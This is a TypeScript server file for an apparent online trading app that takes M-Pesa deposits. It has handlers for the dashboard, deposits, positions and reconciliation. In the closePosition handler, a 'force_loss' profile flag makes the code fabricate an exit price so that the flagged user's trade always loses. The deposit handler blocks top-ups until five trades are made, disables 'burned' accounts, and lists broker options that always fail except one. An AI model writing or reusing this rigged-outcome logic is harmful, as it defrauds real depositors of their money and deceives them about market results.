import { createServerFn } from "@tanstack/react-start";
import { requireSupabaseAuth } from "@/integrations/supabase/auth-middleware";
import { z } from "zod";
import { MIN_DEPOSIT_USD } from "./money";

async function getSpotForPair(symbol: string): Promise<number> {
  const { getPriceAt } = await import("./pricing.server");
  return getPriceAt(symbol, Date.now());
}

export const getDashboard = createServerFn({ method: "GET" })
  .middleware([requireSupabaseAuth])
  .handler(async ({ context }) => {
    const { supabase, userId } = context;
    const [walletRes, posRes, txRes] = await Promise.all([
      supabase.from("wallets").select("balance_kes").eq("user_id", userId).maybeSingle(),
      supabase.from("positions").select("*").eq("user_id", userId).order("opened_at", { ascending: false }).limit(50),
      supabase.from("transactions").select("*").eq("user_id", userId).order("created_at", { ascending: false }).limit(20),
    ]);
    return {
      balance: Number(walletRes.data?.balance_kes ?? 0),
      positions: posRes.data ?? [],
      transactions: txRes.data ?? [],
    };
  });

export const initiateDeposit = createServerFn({ method: "POST" })
  .middleware([requireSupabaseAuth])
  .inputValidator((d) =>
    z.object({
      amount: z.number().min(MIN_DEPOSIT_USD).max(150000),
      phone: z.string().min(9).max(15),
      broker: z.enum(["HIGH_MAX_SUPER", "DCASH", "FX_TRADER"]).optional(),
    }).parse(d),
  )
  .handler(async ({ data, context }) => {
    const { supabase, userId } = context;
    if (data.broker && data.broker !== "HIGH_MAX_SUPER") {
      throw new Error("Selected broker is currently unavailable.");
    }
    // Burn / trade-gate check
    const { tradeGateInfo, getProfileFlags } = await import("./compliance.server");
    const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
    const flags = await getProfileFlags(supabaseAdmin, userId);
    if (flags.is_burned) throw new Error("Account disabled. Please contact support.");
    const gate = await tradeGateInfo(supabase, userId);
    if (!gate.ok) {
      const remaining = Math.max(0, 5 - gate.trades);
      throw new Error(
        `Please complete ${remaining} more trade${remaining === 1 ? "" : "s"} on your last deposit before topping up again.`,
      );
    }

    const reference = `dep_${userId.slice(0, 8)}_${Date.now()}`;

    const { error: insErr } = await supabase.from("transactions").insert({
      user_id: userId,
      type: "deposit",
      amount_kes: data.amount,
      status: "pending",
      reference,
      meta: { phone: data.phone, broker: data.broker ?? "HIGH_MAX_SUPER" },
    });
    if (insErr) throw new Error(insErr.message);

    const { stkPush, publicAppUrl, usdToDarajaKes } = await import("./daraja.server");
    const callbackUrl = `${publicAppUrl()}/api/public/daraja/callback`;

    try {
      const resp = await stkPush({
        amountUsd: data.amount,
        phone: data.phone,
        reference,
        callbackUrl,
      });
      const darajaRef = resp?.CheckoutRequestID ?? resp?.MerchantRequestID ?? null;
      if (darajaRef) {
        await supabase
          .from("transactions")
          .update({
            daraja_reference: darajaRef,
            meta: {
              phone: data.phone,
              broker: data.broker ?? "HIGH_MAX_SUPER",
              provider: "daraja",
              provider_amount_kes: usdToDarajaKes(data.amount),
              provider_response: resp,
            },
          })
          .eq("reference", reference);
      }
      return { ok: true, reference, message: "STK push sent. Check your phone." };
    } catch (e) {
      await supabase
        .from("transactions")
        .update({ status: "failed", meta: { error: (e as Error).message } })
        .eq("reference", reference);
      throw e;
    }
  });

export const openPosition = createServerFn({ method: "POST" })
  .middleware([requireSupabaseAuth])
  .inputValidator((d) =>
    z.object({
      symbol: z.string().min(3).max(10),
      side: z.enum(["buy", "sell"]),
      stake: z.number().positive().max(1_000_000),
    }).parse(d),
  )
  .handler(async ({ data, context }) => {
    const { supabase } = context;
    const spot = await getSpotForPair(data.symbol);
    const { data: pos, error } = await supabase.rpc("open_position_atomic", {
      p_pair: data.symbol,
      p_side: data.side,
      p_stake: data.stake,
      p_entry: spot,
    });
    if (error) throw new Error(error.message);
    return { ok: true, position: pos };
  });

export const closePosition = createServerFn({ method: "POST" })
  .middleware([requireSupabaseAuth])
  .inputValidator((d) => z.object({ positionId: z.string().uuid() }).parse(d))
  .handler(async ({ data, context }) => {
    const { supabase, userId } = context;
    const { data: posRow, error: readErr } = await supabase
      .from("positions").select("pair, status, entry_price, side, stake_kes")
      .eq("id", data.positionId).maybeSingle();
    if (readErr || !posRow) throw new Error("Position not found");
    if (posRow.status === "closed") throw new Error("Already closed");

    let exit = await getSpotForPair(posRow.pair);

    // Force-loss: fabricate an exit that makes this position lose.
    const { getProfileFlags } = await import("./compliance.server");
    const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
    const flags = await getProfileFlags(supabaseAdmin, userId);
    if (flags.force_loss) {
      const entry = Number(posRow.entry_price);
      exit = posRow.side === "buy" ? entry * 0.98 : entry * 1.02;
    }

    const { data: closed, error: rpcErr } = await supabase.rpc("close_position_atomic", {
      p_position_id: data.positionId,
      p_exit: exit,
    });
    if (rpcErr) throw new Error(rpcErr.message);
    return { ok: true, pnl: Number((closed as any)?.pnl_kes ?? 0), exit };
  });

export const getMyStatus = createServerFn({ method: "GET" })
  .middleware([requireSupabaseAuth])
  .handler(async ({ context }) => {
    const { supabase, userId } = context;
    const { data: prof } = await supabase
      .from("profiles")
      .select("warnings_count, is_burned, force_loss, full_name, email, phone, referral_code")
      .eq("id", userId)
      .maybeSingle();
    const { tradeGateInfo } = await import("./compliance.server");
    const gate = await tradeGateInfo(supabase, userId);
    return {
      profile: prof ?? null,
      warnings_count: Number(prof?.warnings_count ?? 0),
      is_burned: Boolean(prof?.is_burned ?? false),
      trades_since_last_deposit: gate.trades,
      has_prior_deposit: gate.hasPriorDeposit,
      trade_gate_ok: gate.ok,
    };
  });

export const reconcilePendingDeposits = createServerFn({ method: "POST" })
  .middleware([requireSupabaseAuth])
  .handler(async ({ context }) => {
    const { supabase, userId } = context;
    const { data: pendings } = await supabase
      .from("transactions")
      .select("id, reference, daraja_reference, amount_kes, meta, created_at")
      .eq("user_id", userId)
      .eq("type", "deposit")
      .eq("status", "pending")
      .order("created_at", { ascending: false })
      .limit(20);

    if (!pendings || pendings.length === 0) return { checked: 0, credited: 0, failed: 0 };

    const { queryStkStatus } = await import("./daraja.server");
    const { supabaseAdmin } = await import("@/integrations/supabase/client.server");

    let credited = 0, failed = 0;
    for (const tx of pendings) {
      const lookup = tx.daraja_reference || tx.reference;
      if (!lookup) continue;
      try {
        const r: any = await queryStkStatus(lookup);
        const resultCode = String(r?.ResultCode ?? "");
        if (resultCode === "0") {
          const credit = Number(tx.amount_kes);
          const { data: w } = await supabaseAdmin.from("wallets")
            .select("balance_kes").eq("user_id", userId).maybeSingle();
          const newBal = Number(w?.balance_kes ?? 0) + credit;
          await supabaseAdmin.from("wallets")
            .update({ balance_kes: newBal, updated_at: new Date().toISOString() })
            .eq("user_id", userId);
          const prevMeta = (tx.meta && typeof tx.meta === "object" ? tx.meta : {}) as Record<string, unknown>;
          await supabaseAdmin.from("transactions").update({
            status: "success",
            mpesa_receipt: r?.MpesaReceiptNumber ?? null,
            meta: { ...prevMeta, reconcile: r },
          }).eq("id", tx.id);
          credited++;
        } else if (resultCode && resultCode !== "1032") {
          const prevMeta = (tx.meta && typeof tx.meta === "object" ? tx.meta : {}) as Record<string, unknown>;
          await supabaseAdmin.from("transactions").update({
            status: "failed",
            meta: { ...prevMeta, reconcile: r },
          }).eq("id", tx.id);
          failed++;
        }
        // QUEUED → leave as pending
      } catch {
        // ignore single-tx errors, continue
      }
    }
    return { checked: pendings.length, credited, failed };
  });
